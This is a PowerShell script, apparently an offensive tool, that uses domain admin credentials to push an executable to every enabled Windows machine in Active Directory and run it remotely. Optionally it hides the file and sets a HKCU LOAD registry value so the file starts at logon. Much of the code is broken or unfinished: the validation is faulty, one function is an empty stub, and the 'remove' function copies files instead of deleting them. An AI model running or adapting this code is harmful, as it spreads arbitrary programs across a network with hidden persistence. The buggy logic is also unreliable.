<#
    Hiding the file and setting a registry key for the file to be launched at boot.
    Modified only for the currently logged in user on the remote machine.

    Full key path: HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows\LOAD

#>
function Set-HiddenFile ($computer,$remoteHostPath,$adm_credential){
    # Make file hidden.
    Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { param ($rhp) $file = get-item $rhp -Force } -ArgumentList $remoteHostPath
	Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { $file.Attributes="Hidden" }

    # Set a LOAD registry Key for persistence.
    Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { 
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $remoteHostPath
    }
}

<#
.DESCRIPTION

Attempts to take a program the user specifies and distribute it across a domain environment.
Must be run with domain admin credentials. 

.PARAMETER FilePath
Full path to an executable the user wishes to distribute.

.PARAMETER Program
Specifies the name of the program as it would be display via Get-Process. No input validation (yet).

.EXAMPLE

PS> Add-DomainExe -FilePath "C:\Windows\Temp\saveme.exe" -Program "saveme" -Persistence N
[+] Attempting to connect to WKST00...
[+] Placing saveme on WKST00 for johnson.user...
[+] Executing saveme on WKST00...

[+] Attempting to connect to WKST01...
...
[+] saveme installed on all hosts!

.EXAMPLE

PS> Add-DomainExe -FilePath "C:\Windows\Temp\saveme.exe" -Program "saveme" -Persistence Y
[+] Attempting to connect to WKST00...
[+] Placing saveme on WKST00 for johnson.user...
[+] Executing saveme on WKST00...
[+] Setting persistence in HKCU\ on WKST00...
[+] Persistence successful on WKST00!
...
[+] saveme installed on all hosts!

#>

function Add-DomainExe {
    # Verify user input for options before script is run.
    param([ValidateScript({ if (-Not ($_ | Test-Path)) {
        throw "File or Folder does not exist. Verify input and run again."
        }
        return $true
        })]$FilePath,
        [ValidateScript({ if (-Not ("Y" -or "N")) {
        throw "Please input Y\N for persistence."
        }
        return $true
        })]$Persistence,
        [parameter(mandatory=$true)]$Username,
        [parameter(mandatory=$true)]$Password,
        $Program

    )
        
    # Take user full path to file and correct it for use across the network.
    $temp_pTF = #$FilePath.Replace(':','') # Change for practical application.
    $netPathFile = $FilePath     #'\\' + $env:computername + '\' + $temp_pTF
    
    # Credential variable without prompt
    $user = $Username
    $pass = ConvertTo-SecureString -String $Password -AsPlainText -Force
    $adm_credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user,$pass
    
    # Get only the names of every system running windows.
    $computers = Get-ADComputer -Filter 'operatingsystem -like "*windows*" -and enabled -eq "true"' | Select-Object -ExpandProperty Name
    
    foreach($computer in $computers) {
        Write-Host "[+] Attempting to connect to: [$computer]..."
        
        # Check if the process is running.
        $prog_running = Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { param ($proc) Get-Process $proc -ErrorAction SilentlyContinue} -argumentlist $program
          
        if ( $prog_running -ne $null) {
            Write-Output "The program is running on [$computer]. No further action necessary."
        }

        else {
            try {
                # Open a remote powershell session directly with the host if Get-WmiObject does not function correctly.
                $s = New-PSSession -ComputerName $computer -Credential $adm_credential

                # Get the currently logged on user's name and if we can't remote into the machine ignore it.
                # $current_user = Get-WmiObject -Class win32_computersystem -ComputerName $item -ErrorAction SilentlyContinue | Select-Object username
                
                # Invoke-Command version.
                $current_user = (Invoke-Command -Session $s -ScriptBlock {param ($comp) Get-WmiObject -Class win32_computersystem -ComputerName $comp -ErrorAction SilentlyContinue | Select-Object username} -ArgumentList $computer) -split '\\'
                $currentuser = $current_user[1].Split(';')
                $currentuser = $currentuser[0]

                Write-Host "[+] Placing [$Program] on [$computer] for [$currentuser]..."
                $remoteHostPath = "C:\Users\$currentuser\Desktop"
                # Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { copy $netPathFile $remoteHostPath}
                Copy-Item $netPathFile -Destination $remoteHostPath -ToSession $s

                if($Persistence -eq "Y"){
                    Set-HiddenFile($computer,$remoteHostPath,$adm_credential)
                    $computer >> persistent_hosts.txt
                }

                "[+] Executing [$Program] on [$computer]" | Tee-Object -FilePath .\hosts_w_file.txt -Append | Write-Host
                # Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { C:\Users\$current_user\Desktop\bad.exe }
                $runtheexe = "C:\users\" + $currentuser + "\Desktop\" + $Program + ".exe"
                $runtheexe
                Invoke-Command -Session $s -ScriptBlock { param ($run) & $run } -ArgumentList $runtheexe

                Remove-PSSession $s
            }

            # If can't connect, print a short message.
            catch [System.UnauthorizedAccessException] {
                Write-Warning -Message "[-] Access Denied: [$computer]"
            }

            # Any other serious errors print the stack trace.
            catch {
                "[-] An Error has occured:" | Tee-Object -FilePath .\hosts_w_file.txt -Append | Write-Host
                Write-Host $_.ScriptStackTrace
            }
        Write-Host ""
        }
    }
    Write-Host "[+] [$Program] installed on all hosts!"
}

<#
.DESCRIPTION

Parse list of hosts with file successfully copied.

.PARAMETER HostFile
Full path to host_w_file.txt.

.PARAMETER OutFile
Location where you'd like the parsed file to be saved. (Optional)

#>

function Convert-RemoteFileHosts(){
    param(
    [parameter(mandatory=$true)]
    $HostFile,
    $OutFile
    )

    #do the thing.
}

<#
.DESCRIPTION

Remove files and verify all registry keys are deleted if set.

.PARAMETER HostFile
Full path to a parsed host list.

#>

function Remove-DomainExe(){
    param(
    [parameter(mandatory=$true)]$HostFile,
    [parameter(mandatory=$true)]$FileName,
    [parameter(mandatory=$true)]$Username,
    [parameter(mandatory=$true)]$Password,
    $PathToFile,
    $WildcardSearch
    )

    Write-Host "[+] Placing [$Program] on [$computer] for [$currentuser]..."
    $remoteHostPath = "C:\Windows\Users\[$currentuser]\Desktop"
    Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { copy $netPathFile $remoteHostPath}
}
